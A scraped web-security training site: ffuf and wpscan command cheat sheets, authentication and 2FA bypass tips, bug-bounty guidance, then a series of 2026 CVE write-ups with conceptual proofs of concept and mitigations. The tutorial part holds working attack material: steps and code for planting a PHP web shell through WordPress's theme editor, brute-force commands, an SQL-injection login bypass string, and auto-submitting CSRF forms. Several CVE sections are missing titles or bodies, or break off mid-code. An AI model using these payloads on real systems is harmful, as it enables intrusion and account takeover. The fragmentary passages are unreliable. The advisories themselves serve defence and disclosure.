docs.title: Attacking Web Applications with Ffuf
docs.text: Fast web fuzzer written in Go. Used for directory discovery, parameter fuzzing, vhost enumeration, and filter bypass.

docs.title: Core Usage
docs.text:
# Directory fuzzing
ffuf -u http://TARGET/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

# Extension fuzzing
ffuf -u http://TARGET/indexFUZZ -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt

# Page fuzzing (with extension)
ffuf -u http://TARGET/FUZZ.php -w wordlist.txt

# Recursive fuzzing
ffuf -u http://TARGET/FUZZ -w wordlist.txt -recursion -recursion-depth 2

# Subdomain/vhost fuzzing
ffuf -u http://TARGET -H "Host: FUZZ.target.com" -w subdomains.txt

# GET parameter fuzzing
ffuf -u "http://TARGET/page.php?FUZZ=value" -w params.txt

# POST data fuzzing
ffuf -u http://TARGET/login -X POST -d "user=admin&pass=FUZZ" -w passwords.txt -H "Content-Type: application/x-www-form-urlencoded"

docs.title: Broken Authentication
docs.text: Vulnerabilities in authentication mechanisms that allow attackers to compromise accounts, bypass login, or impersonate other users.

docs.title: Common Vulnerabilities
docs.text: Vulnerability Description Weak passwords No complexity requirements, default creds No rate limiting Enables brute force Predictable tokens Guessable session IDs or password reset tokens Insecure "remember me" Long-lived tokens stored insecurely 2FA bypass OTP reuse, missing validation, response manipulation Username enumeration Different response for valid vs invalid username Password reset flaws Predictable token, no expiry, host header injection

curl -s -o /dev/null -w "%{http_code} %{size_download}" http://target/login -d "user=admin&pass=wrong"

docs.title: 2FA Bypass
docs.text:
1. Response manipulation: change {"success":false} to {"success":true}
2. Try OTP 000000–999999 if no rate limit (6-digit = 1M combos)
3. Reuse OTP from own account if same algorithm
4. Skip 2FA step entirely by jumping directly to post-2FA URL
5. Modify userId parameter during 2FA to another user

docs.title: Program Selection
docs.text:
Platforms:
- HackerOne     → enterprise programs, high payouts
- Bugcrowd      → many programs, tiered rewards
- Intigriti     → European companies
- YesWeHack     → European focus

Criteria for picking a program:
- Wide scope (*.target.com beats target.com/page only)
- High average bounty
- Active triage (fast response time)
- Hall of fame or reputation points

docs.title: Recon Checklist
docs.text:
1. Subdomain enumeration (subfinder, amass, crt.sh)
2. Port scan on discovered hosts (nmap)
3. Directory brute force (ffuf, dirsearch)
4. Technology fingerprint (whatweb, wappalyzer)
5. JavaScript analysis (find endpoints, tokens, APIs)
6. Google dorking (site:target.com filetype:pdf inurl:admin)
7. GitHub leaks (github.com/search?q=target.com)
8. Shodan/Censys passive scan

docs.title: Vulnerability Assessment Priority
docs.text:
P1 (Critical) → RCE, SQLi with data exfil, Auth bypass admin, Account takeover
P2 (High)     → SQLi read-only, SSRF internal, XSS stored on sensitive page
P3 (Medium)   → CSRF on critical function, IDOR limited scope, Open redirect
P4 (Low)      → Self-XSS, info disclosure (stack trace, version headers)
P5 (Info)     → Missing security headers, content type sniffing

docs.title: Report Writing
docs.text:
# Bug Report Template

**Vulnerability:** [Type] in [Endpoint]
**Severity:** Critical / High / Medium / Low
**CVSS Score:** 9.8 (example)
**CWE:** CWE-89 (SQL Injection)

## Summary
One paragraph — what the bug is and what impact it has.

## Steps to Reproduce
1. Navigate to https://target.com/login
2. Enter `' OR 1=1-- -` in the username field
3. Observe authentication bypass

## Impact
Describe what an attacker can do. Be specific. Include actual exfiltrated data (sanitized).

## Proof of Concept
[Screenshot or video]
[curl command that reproduces the bug]

## Recommended Fix
Parameterized queries / input validation / etc.

docs.title: Responsible Disclosure
docs.text:
• Report before public disclosure
  • Give vendor reasonable time to fix (90 days standard)
  • Don't access/exfiltrate user data beyond proving the vulnerability
  • Don't perform DoS or destructive tests

docs.text: Local File Inclusion (LFI) and Remote File Inclusion (RFI) occur when user input is used to build a file path for include(), require(), or similar functions without proper sanitization.

docs.title: Hacking WordPress
docs.text: WordPress is the world's most deployed CMS and a frequent target. Vulnerabilities commonly arise from outdated plugins, themes, and weak credentials.

docs.title: Enumeration
docs.text:
# WPScan — full scan
wpscan --url http://target/ --enumerate u,p,t,cb,dbe

# Enumerate users only
wpscan --url http://target/ --enumerate u

# Enumerate plugins (aggressive)
wpscan --url http://target/ --enumerate p --plugins-detection aggressive

# Brute force credentials
wpscan --url http://target/ -U users.txt -P /usr/share/wordlists/rockyou.txt

# Manual user enumeration via author ID
curl http://target/?author=1
curl http://target/wp-json/wp/v2/users

docs.title: Interesting Files
docs.text:
/wp-login.php          # Admin login
/wp-admin/             # Dashboard
/wp-config.php         # DB credentials (not directly readable via web)
/wp-content/plugins/   # Plugin code
/wp-content/uploads/   # Uploaded files
/xmlrpc.php            # Legacy API (enables brute force in one request)

docs.title: RCE via Theme Editor
docs.text:
1. Login to /wp-admin/
  2. Appearance → Theme Editor
  3. Edit 404.php or functions.php
  4. Insert: <?php system($_GET['cmd']); ?>
  5. Visit http://target/wp-content/themes/<theme>/404.php?cmd=id

docs.title: RCE via Plugin Upload
docs.text:
1. Login → Plugins → Add New → Upload Plugin
  2. Upload a ZIP containing a malicious .php file
  3. Activate the plugin
  4. Trigger the shell at /wp-content/plugins/<plugin>/shell.php?cmd=id

docs.title: CSRF (Cross-Site Request Forgery)
docs.text:
Tricks authenticated users into submitting malicious requests to a target site.

<!-- Victim visits attacker page, triggers request to bank -->
<img src="https://bank.com/transfer?to=attacker&amount=1000">

<!-- Form-based CSRF -->
<form action="https://target.com/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>

Bypass CSRF protections: 

- Remove CSRF token entirely → may still work
- Use another user's valid CSRF token (if not tied to session)
- Change request method: POST → GET
- Change Content-Type: application/json → text/plain

docs.title: CVE-2026-102503 — Google SAM: Two Open Doors Into the Agent Mesh (Auth Bypass)
docs.text:
Field Value Severity Critical — CVSS 9.8 Product google/sam — Sovereign Agent Mesh (SAM), 0.1.0-alpha.1 through 0.1.0-alpha.8 Type Missing Authentication for Critical Function (CWE-306); Missing Authorization (CWE-862); Initialization with Insecure Default (CWE-1188) Vector Unauthenticated, network → unauthorized tool execution / full mesh compromise

This writeup covers two CVEs published together against the same product:

CVE Issue CVE-2026-102503 Critical 9.8 — the /libp2p-http ingress server (StartIngressServer in cmd/sam-node/node.go) exposes every registered backend service with no authorization check. Any peer that can dial the node invokes arbitrary backends (command/stdio MCP servers, A2A, inference) — the parallel MCP-protocol path enforces biscuit auth, the ingress skips it entirely. Fixed in v0.1.0-alpha.3. CVE-2026-103091 The MCP proxy and OIDC registration flow (HandleStreamPassThrough in mcp_service.go; GET /info and POST /register in internal/controlplane/server.go) let a remote attacker self-enroll into the mesh and invoke arbitrary tools on every connected node. /info publicly discloses the OIDC config, /register auto-enrolls any valid OIDC token with no claim filtering or ban check, and the shipped default policy binds sam:system:authenticated to allowed_services: ["*"]. Fixed in v0.1.0-alpha.9.

docs.title: Affected versions
docs.text:
• CVE-2026-102503: SAM 0.1.0-alpha.1 through 0.1.0-alpha.2. Fixed in v0.1.0-alpha.3.
  • CVE-2026-103091: SAM 0.1.0-alpha.1 through 0.1.0-alpha.8. Fixed in v0.1.0-alpha.9.

docs.title: Root cause
docs.text:
The mesh has one real security boundary — biscuit capability tokens checked by WithBiscuitAuth → Authorize — but it is wired to exactly one path: the MCP protocol stream handler (api.MCPProtocolID). The second, parallel ingress (/libp2p-http) calls the same backend handlers with no Authorize, no biscuit, no auth frame anywhere in the code path. The connection gater only blocks banned/revoked peers, and TLS only proves a peer owns a keypair — neither proves membership.

// Simplified vulnerable pattern (cmd/sam-node/node.go)
node.Host.SetStreamHandler(api.MCPProtocolID,
    node.WithBiscuitAuth(node.HandleMCPStream))  // gated
// ...
server := &http.Server{Handler: http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
    svc, ok := n.services.Get(serviceName)
    svc.Handler().ServeHTTP(w, r)  // <-- reached with NO authorization
})}

For CVE-2026-103091, the enrollment side is the weak link: GET /info leaks the OIDC issuer/client config to anyone, POST /register mints a 90-day mesh credential for any valid OIDC token (no email/domain/claim filtering, no ban check — bans are keyed on a regenerable peer_id), and the default policy grants every authenticated member allowed_services: ["*"], making the service-level biscuit check meaningless.

docs.title: Proof of concept (conceptual)
docs.text:
The attack chain for CVE-2026-102503:

  1. The attacker creates a fresh libp2p identity — never enrolled, no biscuit. Nodes ship bound to 0.0.0.0 with public DHT discovery, so the node is dialable over the network.
  2. They open the /libp2p-http ingress stream and POST a JSON-RPC tools/call to /mcp/<service>/ naming a deny-listed tool (e.g. delete_tables).
  3. The ingress invokes the backend handler directly: HTTP 200 and the tool executes. The identical call over the biscuit-gated MCP path is rejected with Authorization failed.
  4. For command/stdio-backed MCP services, the call drives the backend subprocess — attacker-controlled tool invocation, up to remote code execution where the backend exposes it.

For CVE-2026-103091: fetch /info, obtain any valid token from the project's OIDC provider, POST it to /register, and you are a full mesh member — the wildcard policy then authorizes every tool on every node.

The accompanying poc.py demonstrates the pattern safely: a request dispatcher that routes around the auth gate versus one that enforces it on every path, plus an enrollment check that rejects unapproved members versus the auto-enroll default. Fully offline, synthetic data — no exploit, no network calls.

docs.title: Mitigation
docs.text:
• Update sam-node to v0.1.0-alpha.3 or later and the control plane to v0.1.0-alpha.9 or later.
  • Replace the wildcard default policy with least-privilege allowed_services/allowed_targets per node.
  • Require enrollment approval: validate OIDC claims (email, domain, group) and enforce a ban check keyed on something stronger than a regenerable peer ID.
  • Block libp2p ports at the network edge; do not rely on the mesh's shipped 0.0.0.0 binds in untrusted networks.
  • Rotate any mesh credentials issued while the flaws were exposed and audit tool-invocation logs for calls from un-enrolled peers.

docs.title: CVE-2026-103314 — RHACS SAML Assertion Replay (HIGH 7.4)
docs.text: Field Detail Severity HIGH (CVSS 3.1: 7.4) Product Red Hat Advanced Cluster Security for Kubernetes (RHACS) — Central Type Authentication bypass by capture-replay (CWE-294) Attack vector Network

docs.title: Affected versions
docs.text: Red Hat Advanced Cluster Security for Kubernetes — Central, with SAML authentication enabled, prior to the Red Hat security update addressing CVE-2026-103314. Consult the Red Hat security advisory linked below for the exact fixed release and upgrade to it.

docs.title: Root cause
docs.text: Central's SAML authentication ACS endpoint verifies that a received SAML response is validly signed and not expired, but it does not retain the assertion or response identifiers it has already processed. SAML assertions are meant to be single-use tickets; without a used-ID cache, any valid, unexpired response can be submitted any number of times, and each submission is honored as if it were a brand-new login.

docs.title: Proof of concept
docs.text:
Conceptual attack chain only (educational):

  1. The victim authenticates once via SAML SSO; the IdP returns a signed SAML response containing an assertion with a unique ID and an expiry time.
  2. The attacker obtains a copy of that valid, still-unexpired signed response (e.g. from logs, a proxy capture, or a compromised endpoint).
  3. The attacker re-submits the identical response to Central's SAML ACS endpoint.
  4. Central validates the signature and expiry, finds nothing preventing reuse, and issues a fresh authentication token.
  5. Steps 3–4 are repeated; each replay yields another distinct token for the mapped identity.

Vulnerable vs fixed pattern:

# VULNERABLE: signature + expiry only, no replay check
def handle_saml_response(resp):
    if verify_signature(resp) and not expired(resp):
        return issue_token(resp.identity)   # replay accepted!

# FIXED: single-use assertion/response ID cache with expiry
def handle_saml_response_fixed(resp):
    if not verify_signature(resp) or expired(resp):
        return reject("invalid")
    if resp.id in seen_ids:                 # already redeemed?
        return reject("replay detected")
    seen_ids.add(resp.id, ttl=resp.expiry)   # remember until expiry
    return issue_token(resp.identity)

This is a conceptual illustration. It is not a working exploit and must not be used against systems you do not own or administer.

docs.title: Mitigation
docs.text:
• Upgrade Central to the RHACS release carrying Red Hat's fix for CVE-2026-103314 (see the advisory below) and revoke existing sessions.
  • Rotate any Central tokens or credentials that could have been minted from replayed responses.
  • Monitor Central/SAML logs for duplicate assertion or response IDs — the same ID appearing more than once is a replay indicator.
  • Restrict and instrument the SAML ACS endpoint; treat captured SAML responses as sensitive material.

docs.title: CVE-2026-104627 — Gitea: One-Click Account Takeover via OpenID Linking
docs.text:
Field Value Severity High — estimated CVSS 8.4 (NVD score not yet published at time of writing; see note below) Product Gitea (self-hosted git service) Type Improper Authentication (CWE-287) + Cross-Site Request Forgery (CWE-352) Vector Network, no attacker account needed, one victim click → full session as victim (MFA bypassed)

Scoring note: this CVE was disclosed on 2026-10-18 and had no published CVSS at the time this writeup was made. The 8.4 estimate follows CVSS v3.1 for AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N: an account-takeover that bypasses the victim's TOTP/WebAuthn. Treat it as an editorial estimate, not an official score.

docs.title: Affected versions
docs.text: Gitea versions before 28.2.0. Fixed in 28.2.0 (released 2026-10-18). This was the headline flaw of a 12-CVE security batch disclosed with that release — including CVE-2026-109553 (SSH certificate principal confusion that could also impersonate users) and CVE-2026-105964 (Actions artifact memory exhaustion).

docs.title: Root cause
docs.text:
The OpenID association callback in the security settings accepted a positive OpenID 2.0 assertion without checking that the signed-in user had actually started a linking flow. Because OpenID 2.0 permits unsolicited assertions, an attacker-controlled OpenID provider could answer the callback on behalf of a victim who merely opened a crafted link — and Gitea attached the attacker's identity to whichever account was signed in.

Worse, the follow-up sign-in through OpenID login never runs the local TOTP/WebAuthn checks, so the attacker logs in as the victim with no password and no second factor.

// Simplified vulnerable pattern (routers/web/user/setting/security/openid.go)
func settingsOpenIDVerify(ctx) {
    assertion := parse(ctx.Request.URL)      // attacker-influenced callback
    id := openid.Verify(assertion)           // signed? yes — provider is the attacker's
    models.AddUserOpenID(ctx.Doer.ID, id)    // who started this linking? nobody asked
}

The fix binds each linking attempt to the initiating session with a short-lived, single-use state value; callbacks without a matching pending transaction are rejected even if the assertion verifies.

docs.title: Proof of concept (conceptual)
docs.text:
The attack chain is:

  1. The attacker sets up their own OpenID 2.0 provider and an unused identifier.
  2. They send the victim a crafted link to Gitea's settings security callback.
  3. The victim, signed in, opens the link; the attacker's provider returns a valid signed assertion.
  4. Gitea links the attacker's OpenID identity to the victim's account.
  5. The attacker signs in through OpenID login as the victim — TOTP/WebAuthn are never prompted.

The accompanying poc.py in this folder demonstrates the pattern safely: a mock callback that accepts an assertion without a pending-link record versus a fixed callback that requires a session-bound state token. It runs entirely offline against synthetic data — no exploit, no network calls.

docs.title: Mitigation
docs.text:
• Update Gitea to 28.2.0 or later immediately.
  • Audit linked OpenID identities on all accounts (user_open_id mappings).
  • Disable OpenID sign-in if you do not use it.
  • Review admin sessions and rotate tokens/SSH keys for high-value accounts.
  • As general hygiene: keep DISABLE_REGISTRATION on unless you need open sign-ups, and isolate Actions runners from internal networks.

docs.title: CVE-2026-104736 — LearnPress Unauthenticated PHP Object Injection
docs.text: Field Detail Severity Critical 9.8 (CVSS 3.1) Product LearnPress WordPress LMS plugin, up to and including 4.4.10 Type PHP Object Injection via deserialization of untrusted input (CWE-502) Attack vector Network · unauthenticated · checkout-email parameter in the checkout AJAX action

docs.title: Affected versions
docs.text: LearnPress ≤ 4.4.10. Fixed in 4.4.11.

docs.title: Root cause
docs.text:
During checkout, the checkout-email request parameter is passed through sanitize_text_field(). That function strips HTML tags and invalid UTF-8, but it does not strip PHP serialized-object syntax such as O:8:"EvilClass":0:{}.

The value is stored in the LearnPress session table and, on subsequent requests, LP_Session_Handler::get() feeds it into LP_Helper::maybe_unserialize() → unserialize() without an allowed_classes restriction. The attacker's serialized object is instantiated inside the WordPress process — no login required.

docs.title: Proof of concept
docs.text:
The attack chain, conceptually:

  1. Attacker POSTs to the checkout AJAX action with checkout-email set to a serialized PHP object.
  2. sanitize_text_field() lets the payload through untouched; it is stored in the session table.
  3. On the next request, unserialize() instantiates the attacker's class. Depending on which gadget classes the installed plugins expose, this leads to arbitrary file deletion, file writes, or remote code execution.

A public PoC is already circulating — assume active exploitation. See poc.py for an educational illustration of the vulnerable vs. fixed pattern (simplified, safe demo only).

docs.title: Mitigation
docs.text:
• Update LearnPress to 4.4.11 or newer immediately.
  • If you cannot update yet: block the checkout AJAX action at the firewall/WAF and inspect the session table for anomalous rows.
  • Long term: never unserialize() untrusted input; use allowed_classes => false or JSON.

Educational only. Only ever test in controlled environments you own.

docs.title: CVE-2026-107436 — Strong Testimonials: PHP Object Injection Through Review Data
docs.text: Field Value Severity High — CVSS 8.8 Product Strong Testimonials WordPress reviews plugin Type Deserialization of Untrusted Data (CWE-502) Vector Unauthenticated, network → code execution via gadget chain (triggered at render time)

docs.title: Affected versions
docs.text: Strong Testimonials through 3.3.12. Fixed in versions past 3.3.12.

docs.title: Root cause
docs.text:
The plugin stores review data in serialized form and rebuilds it with PHP's unserialize() on every page view — from input the attacker can influence, with no signature or integrity check. unserialize() does not just parse data: it instantiates whatever classes the bytes describe and runs their magic methods (__wakeup, __destruct, …) on the server.

// Simplified vulnerable pattern
$stored = get_from_database();  // attacker-influenced review data
$review = unserialize($stored); // live objects rebuilt, methods fire

docs.title: Proof of concept (conceptual)
docs.text:
The attack chain is:

  1. The attacker crafts a serialized payload that chains together gadget classes already present in WordPress — a POP chain — and gets it into the data the plugin unserializes.
  2. A visitor (or the attacker) loads any page that renders testimonials.
  3. At render time the plugin unserializes the payload; the gadget chain fires, running the attacker's logic with the web server's privileges.

The accompanying poc.py demonstrates the pattern safely: a mock review store whose vulnerable renderer instantiates attacker-named classes from a payload, versus the fixed renderer that only accepts plain data and rejects class markers. Fully offline, synthetic data — no exploit, no network calls.

Depending on the gadgets available, the impact ranges from rewriting site options and planting files to full remote code execution — and every page view that renders testimonials can re-trigger it.

docs.title: Mitigation
docs.text:
• Update Strong Testimonials past 3.3.12 immediately.
  • Audit wp_options for unexpected changes (siteurl, admin users, active plugins).
  • Scan uploads and plugin folders for unfamiliar files.
  • Prefer json_decode() over unserialize() for stored data, and sign anything that must round-trip through storage.

docs.title: CVE-2026-108097 — Remote Code Execution in Drupal Core Field UI
docs.text: Field Detail Severity Critical (Drupal 19/25) Product Drupal core — Field UI module (field_ui) Type Remote Code Execution Attack vector Unauthenticated — via contributed modules or custom code that expose the vulnerable table rendering CVE CVE-2026-108097 Advisory SA-CORE-2026-014 (2026-10-14)

docs.title: Affected versions
docs.text:
• Drupal >= 8.9.0 and < 10.6.19
  • Drupal >= 11.0.0 and < 11.3.19
  • Drupal >= 11.4.0 and < 11.4.10
  • Drupal >= 12.0.0-alpha1 and < 12.0.0-beta2

(Branches 8.x, 9.x, <= 10.5.x and <= 11.2.x are end-of-life and receive no patch.)

docs.title: Root cause
docs.text: Field UI builds administrative tables with Drupal's render system. Before the fix, each table row could carry a #region_callback property, and the module executed it as a PHP callable during pre-render without validating the callback. Drupal core alone never hands remote input to that code path — but contributed modules and custom code can render those tables from attacker-controlled data, and at least one known path requires no authentication. Reported by Drew Webber and Octavio Galland.

docs.title: Proof of concept
docs.text:
Educational illustration of the bug class only. No working exploit is provided. Test only in controlled environments against systems you own.

Conceptual attack chain:

  1. The attacker (no login) finds a contributed-module page that renders a Field UI admin table.
  2. The request smuggles a malicious PHP callable into the row's #region_callback.
  3. Field UI's pre-render step invokes it blindly → arbitrary PHP runs as the web-server user.

Simplified vulnerable vs. fixed pattern (see poc.py):

// VULNERABLE (simplified)
call_user_func($row['#region_callback']);

// FIXED (simplified): allow-list only
$allowed = ['field_ui_table_region'];
if (in_array($cb, $allowed, TRUE)) {
    call_user_func($cb);
}

docs.text:

  • Drupal Steward blocks some known vectors but not all — still patch.
  • Hunt for compromise: shells or script interpreters spawned by PHP/web-server processes, unknown files in the web root, unexpected outbound traffic.

docs.title: CVE-2026-108123 — WP Booking System: Missing Authorization on Booking Actions
docs.text: Field Value Severity High — CVSS 7.5 Product WordPress plugin wp-booking-system (WP Booking System – Booking Calendar) Type Missing Authorization (CWE-862) Vector Unauthenticated, network → privileged booking actions and customer data

docs.title: Affected versions

docs.title: CVE-2026-108485 — eStore Theme: Reflected XSS in the Storefront
docs.text: Field Value Severity High — CVSS 7.1 Product eStore WordPress shop theme Type Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') (CWE-79) Vector Unauthenticated, network → session hijacking via crafted link (phishing)

docs.text: eStore theme through 1.6.13. Fixed in versions past 1.6.13.

docs.title: Root cause
docs.text:

// Simplified vulnerable pattern

// fixed: echo esc_html($_GET['s']); // encoded before output

  2. The link is sent to a store admin or a logged-in customer — phishing email, comment, DM. The URL looks like the victim's own shop.

The accompanying poc.py demonstrates the pattern safely: a mock theme template whose vulnerable renderer interpolates the raw parameter, versus the fixed renderer that HTML-encodes it. Fully offline, synthetic data — no exploit, no network calls.

An admin session means full site takeover; a customer session means stolen accounts, orders, and payment details. One click is all it takes.

docs.title: Mitigation
docs.text:

  • Warn users about suspicious shop links; treat unexpected login prompts with suspicion.
  • Review admin sessions for unknown logins and force re-authentication.

docs.title: CVE-2026-108983 — GeoVision GV-ASManager: OS Command Injection in GeoWebServer.exe
docs.text: Field Value Severity Critical — CVSS 9.8 Product GeoVision GV-ASManager 6.3.0 (GeoWebServer.exe) — surveillance / access control server Type OS Command Injection (CWE-78) Vector Network → crafted request to the default connection ports of GeoWebServer.exe → arbitrary OS commands, no authentication

docs.title: Affected versions
docs.text:
GeoVision GV-ASManager 6.3.0.

As of 2026-10-19, no vendor patch is confirmed — the CVE does not yet appear in GeoVision's published Security Advisory Index. GeoVision's disclosure policy allows CVE details to be published before fixes are available.

docs.title: Root cause
docs.text:
GeoWebServer.exe handles the product's web server default connection ports. Request data from those ports is concatenated into an OS command string with no neutralization of shell metacharacters (CWE-78: Improper Neutralization of Special Elements used in an OS Command).

Characters like ;, |, $, and & pass straight through into the shell, so attacker-controlled input escapes its intended argument and executes arbitrary commands with the server's own privileges.

# Simplified vulnerable pattern
user_input = request.get("target")          # attacker-controlled
cmd = "ping " + user_input                  # string glued into a shell command
os.system(cmd)                              # ; | $ & execute as NEW commands

docs.title: Proof of concept (conceptual)
docs.text:
The attack chain is:

  1. The attacker sends one crafted request to the GeoWebServer.exe default connection port (no login, no privileges needed).
  2. Unsanitized input is concatenated into an OS command string.
  3. The shell interprets the injected metacharacters as new commands.
  4. The commands run with the server's privileges — full compromise of confidentiality, integrity, and availability (CVSS 9.8).

The accompanying poc.py demonstrates the pattern safely: a mock command builder that glues untrusted input into a shell string versus a fixed version that avoids the shell entirely and validates input against an allow-list. Fully offline, synthetic data — no exploit, no network calls.

A sibling flaw in the same process, CVE-2026-108984 (High, 7.5, CWE-121 stack-based buffer overflow), lets remote unauthenticated attackers crash the server entirely.

docs.title: Mitigation
docs.text:
• Isolate the GV-ASManager server from the internet right now.
  • Firewall the GeoWebServer.exe default connection ports; do not expose the management web interface to untrusted networks.
  • Monitor GeoWebServer.exe for suspicious child processes and unusual outbound network activity.
  • Check GeoVision's cyber security page for the fix and apply it the day it lands.
  • If the server was exposed, rotate all credentials on and around it.

docs.title: CVE-2026-109588 — FreeRTOS-Kernel MPU Buffer-Length Truncation
docs.text: Field Detail Severity High 8.8 (CVSS 3.1) / 9.3 (CVSS 4.0) Product FreeRTOS-Kernel V11.3.0 and V11.3.1, Arm Cortex-R82 (Armv8-R AArch64) MPU port Type Numeric truncation (CWE-681) → MPU bypass, privileged memory access Attack vector Local · low-privileged task on MPU-enabled builds

docs.title: Affected versions
docs.text: FreeRTOS-Kernel V11.3.0 / V11.3.1 (Cortex-R82 MPU port). Fixed in V11.3.2+.

docs.title: Root cause
docs.text:
The MPU buffer-authorization check truncates the caller-supplied length (32-bit → 16-bit) before validating it:

len = (uint16_t) user_len;      // top bits silently dropped
if (in_window(buf, len)) allow();

The guard validates the small truncated window, but the hardware then honours the full length — so an unprivileged task reaches privileged kernel memory through a stream-buffer system call.

docs.title: Proof of concept
docs.text:
poc.py is an educational illustration of the truncation vs the fix. Pure integer arithmetic — no hardware, no kernel. For learning only.

python3 poc.py

Conceptual attack chain:

  1. Unprivileged task calls a stream-buffer syscall with a crafted length like 0x10001.
  2. Truncation to 16 bits yields 0x0001 → passes the MPU window check.
  3. The real 0x10001-length access lands in privileged kernel memory.

docs.title: Mitigation
docs.text:
• Upgrade to FreeRTOS-Kernel V11.3.2+ and rebuild all firmware.
  • Audit devices running the Cortex-R82 MPU port on 11.3.0/11.3.1 — treat them as exposed until patched.

docs.text: Booktics through 1.0.29. Fixed in versions past 1.0.29. Both flaws (CVE-2026-109894 SQL injection and CVE-2026-109895 DOM-based XSS) ship in the same plugin install.

docs.title: Root cause

The second flaw is the same mistake in JavaScript: untrusted strings written straight into the page (DOM XSS) instead of encoded text.

# Simplified vulnerable pattern
query = "SELECT * FROM bookings WHERE name = '" + user_input + "'"
db.execute(query)   # attacker input becomes part of the SQL
# fixed:
# db.execute("SELECT * FROM bookings WHERE name = %s", (user_input,))

  2. They UNION out the users table through the same field: logins, emails, password hashes.

The accompanying poc.py demonstrates the SQL injection pattern safely: a mock database whose vulnerable query builder concatenates input (and a fake "UNION probe" detector shows the leak), versus the fixed builder that uses bound parameters. The whole database is readable — every account, every email, every hashed password — ready for offline cracking.

• Update Booktics past 1.0.29 immediately.

  • Force a password reset for all users and rotate salts and API keys.
  • Treat booking form fields with the same suspicion as login forms.

docs.text: Field Value Severity High — CVSS 7.2 Product Salon Booking System WordPress plugin Type Incorrect Privilege Assignment (CWE-266) Vector Low-privilege (staff/booking account), network → administrator

docs.text: Field Value Severity Critical — CVSS 9.8 Product OttoKit (formerly SureTriggers) WordPress automation plugin, 100k+ sites Type Missing Authorization (CWE-862) Vector Unauthenticated, network → administrator account creation

docs.text: OttoKit through 1.1.40. Fixed in versions past 1.1.40.

The application-password verification misfires on top, so empty or invalid credentials still open the door. Identity by claim, not proof.

// Simplified vulnerable pattern
if ($_SERVER['HTTP_USER_AGENT'] === 'OttoKit') {
    create_wp_connection($details);  // trusted by header alone
}
// fixed: verify a signed credential AND current_user_can('manage_options')

docs.text:
The attack chain is:

  1. The attacker sends a crafted REST request to the plugin's connection endpoint — no login, no password — with the User-Agent set to OttoKit and forged connection details.
  2. The plugin accepts the header as identity and mishandles the application-password verification.
  3. The attacker receives an authenticated session and creates a new administrator account (or takes over an existing one).

The accompanying poc.py demonstrates the pattern safely: a mock connection endpoint whose vulnerable variant trusts the header, versus the fixed variant that requires a signed token plus a capability check. Fully offline, synthetic data — no exploit, no network calls.

docs.title: CVE-2026-110373 — Login with Phone Number: Privilege Escalation After Verification
docs.text: Field Value Severity High — CVSS 8.1 Product Login with Phone Number WordPress auth plugin Type Incorrect Privilege Assignment (CWE-266) Vector Unauthenticated (self-registration), network → administrator

docs.title: Affected versions
docs.text: Login with Phone Number through 1.8.77. Fixed in versions past 1.8.77.

docs.title: Root cause
docs.text:
During the phone-number login flow the plugin assigns capabilities or roles without properly checking what the account should hold. Verifying a phone number proves who owns the number — it says nothing about what the account may do. The plugin conflated the two: successful verification flowed straight into privileged assignment with no allow-list and no capability check.

// Simplified vulnerable pattern
if (verify_phone($number)) {            // proves number ownership only
    $account->set_role('administrator'); // ...yet grants privileges anyway
}
// fixed: assign the role from an allow-list, defaulting to the

docs.title: CVE-2026-110383 — E-Signature for Fluent Forms: IDOR Exposes Signed Documents
docs.text: Field Value Severity High — CVSS 7.5 Product Electronic Signature add-on for Fluent Forms (WordPress) Type Authorization Bypass Through User-Controlled Key (CWE-639) Vector Unauthenticated/low-privilege, network → read any signed document

docs.title: Affected versions
docs.text: Electronic Signature add-on for Fluent Forms through 2.0.5. Fixed in versions past 2.0.5.

docs.title: Root cause
docs.text:
The plugin fetches a signed document using an ID taken straight from the request, without checking that the requester owns it or may see it. Knowing a document's ID is treated as permission to read it — and sequential, predictable IDs make enumeration trivial.

// Simplified vulnerable pattern
$doc = get_document($_GET['doc_id']);  // no ownership check
serve($doc);
// fixed:
if ($doc->owner_id !== current_user_id()) { deny(); }

docs.title: Proof of concept (conceptual)
docs.text:

  1. The attacker signs one document legitimately and notes its ID.
  2. They simply increment the number — doc 1024, 1025, 1026 — requesting each in turn. No hacking tools, just a browser and patience.
  3. The plugin serves every document back: contracts, personal data, handwritten signatures.

The accompanying poc.py demonstrates the pattern safely: a mock document store whose vulnerable serve function honors any ID, versus the fixed one that enforces ownership. Fully offline, synthetic data — no exploit, no network calls.

Every signed document on the site becomes readable and downloadable by anyone who can count — a privacy breach and, depending on the data, a regulatory incident.

docs.title: Mitigation
docs.text:
• Update the Electronic Signature add-on past 2.0.5 immediately.
  • Check access logs for sequential doc_id enumeration patterns.
  • Notify affected clients if documents were exposed.
  • Enforce ownership checks on every object fetched by a request-supplied ID; prefer unguessable identifiers.

docs.title: CVE-2026-110653 — LatePoint OTP Race Condition → Authentication Bypass
docs.text: Field Detail Severity Critical 9.1 (CVSS 3.1) Product LatePoint (WordPress appointment booking plugin), ≤ 5.7.4 Type Authentication bypass via race condition / TOCTOU (CWE-287) Attack vector Network · unauthenticated request_otp / verifyOTP endpoints

docs.title: Affected versions
docs.text: All versions up to and including 5.7.4.

docs.title: Root cause
docs.text: verifyOTP increments the OTP attempt counter with a non-atomic read-modify-write: the counter is read into memory, incremented there, and written back with no SELECT ... FOR UPDATE row lock and no conditional UPDATE ... WHERE attempts < 10 guard. Concurrent requests therefore all read the same stale value, so the 10-attempt lockout never engages (time-of-check to time-of-use). The anti-CSRF nonce does not mitigate this because the unauthenticated request_otp endpoints issue nonces freely.

docs.title: Proof of concept
docs.text:
Conceptual attack chain (educational only): 1. The attacker knows the victim's email or phone number (often public for businesses that take bookings). 2. The attacker calls request_otp for the victim's account. 3. The attacker fires dozens of OTP guesses at verifyOTP concurrently. 4. Every concurrent request reads the same stale attempt count, so the lockout never trips. 5. One guess lands → authenticated session as the victim → victim's bookings readable.

The bundled poc.py simulates the vulnerable counter versus an atomic counter under concurrent threads. It touches no real system — pure local simulation.

docs.title: Mitigation
docs.text:
• Update LatePoint past 5.7.4 immediately.
  • Audit recent logins and sessions for unknown devices.
  • Enforce rate limits atomically: conditional updates (UPDATE ... WHERE attempts < N), row-level locks, and limits checked in the database rather than in application memory.

